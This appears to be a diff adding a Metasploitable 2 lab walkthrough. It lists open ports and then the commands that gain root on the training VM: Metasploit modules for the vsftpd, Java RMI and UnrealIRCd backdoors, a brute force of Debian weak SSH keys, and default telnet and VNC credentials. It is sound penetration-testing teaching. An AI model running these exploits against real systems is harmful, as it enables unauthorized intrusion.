@@ -1,0 +1,112 @@
+Now that we know our target IP, let's start by scanning the ports and try to get more information about it:
+
+
+
+The scan shows us that the following ports are open:
+
+Port 21 - Running vsftpd
+Port 22 - Running OpenSSH
+Port 23 - Running telnet
+Port 25 - Running Postfix smtpd
+Port 53 - Running ISC BIND
+Port 80 - Running Apache web server
+Port 111 - Running RPC
+Port 139 - Running Samba
+Port 445 - Running Samba
+Port 512 - Running netkit-rsh
+Port 513 - Running some sort of login
+Port 514 - Running tcp-wrapped
+Port 1099 - Running JAVA RMI Registry
+Port 1524 - Running Metasploitable root shell
+Port 2049 - Running RPC
+Port 2121 - Running ProFTPD
+Port 3306 - Running MySQL
+Port 5432 - Running PostgreSQL
+Port 5900 - Running VNC
+Port 6000 - Running X11
+Port 6667 - Running UnreallRCd
+Port 8009 - Running Apache Jserv
+Port 8180 - Running Apache Tomcat
+As we can see, many services are running on the machine. This is going to be interesting.
+
+Let's start at the top. I remember Metasploit having an exploit for vsftpd. Let's see if my memory serves me right:
+
+
+
+It is there! However, it is for version 2.3.4. Checking back at the scan results, shows us that we are in luck:
+
+
+
+Using that exploit:
+
+$ use exploit/unix/ftp/vsftpd_234_backdoor
+
+$ set PAYLOAD cmd/unix/interact
+
+
+
+Moreover, we are root! Pretty simple.
+
+Let's see how else we can exploit this machine:
+
+Moving on to the next port, 22 for OpenSSH. While doing some research, I found that OpenSSH 4.7p1 Debian 8ubuntu1 is vulnerable to Bruteforce. CVE 2008-0166 (https://www.rapid7.com/db/vulnerabilities/openssl-debian-weak-keys ).
+
+For the vulnerability, I found an exploit: https://www.exploit-db.com/exploits/5632/
+
+Let's use this and see what we get:
+
+$ ruby ./5632.rb 172.16.92.140 root rsa/2048
+
+Note: To test for all the files in the rsa/2048 (https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/sploits/5622.tar.bz2 ) increase the THREADCOUNT in the exploit.
+
+
+
+And a key is found. Let's try to use it and see if this works:
+
+$ ssh -i rsa/2048/57c3115d77c56390332dc5c49978627a-5429 root@172.16.92.140
+
+
+
+And we are root!
+
+Note: For exploitation of Port 80, 445, 5432, and 8180 kindly refer to Metasploitable - 1: Walkthrough and the process are similar.
+
+Moving on to Port 23, let's run Metasploit:
+
+$ use auxiliary/scanner/telnet/telnet_version
+
+
+
+As we can see, it shows us the credentials msfadmin:msfadmin.
+
+$ telnet 172.16.92.140
+
+
+
+Playing around with this shows us that msfadmin user has sudo root privileges:
+
+
+
+Moving on to port 1099 running Java RMI registry, let' search what it gives us:
+
+After going a basic google search, I found the following exploit: https://www.rapid7.com/db/modules/exploit/multi/misc/java_rmi_server
+
+$ use exploit/multi/misc/java_rmi_server
+
+
+
+And we have root!
+
+Moving on port 5900, I tried to connect it via VNC and tried the common passwords:
+
+$ vncviewer 172.16.92.140
+
+It turns out that the password is "password" and we have root privileges as well.
+
+
+
+
+
+Moving on to port 6667, we can see that UnreallRCd is running with version Unreal3.2.8.1. A basic search shows that a vulnerability is present (CVE 2010-2075) for backdoor command execution:
+
+$ use exploit/unix/irc/unreal_ircd_3281_backdoor
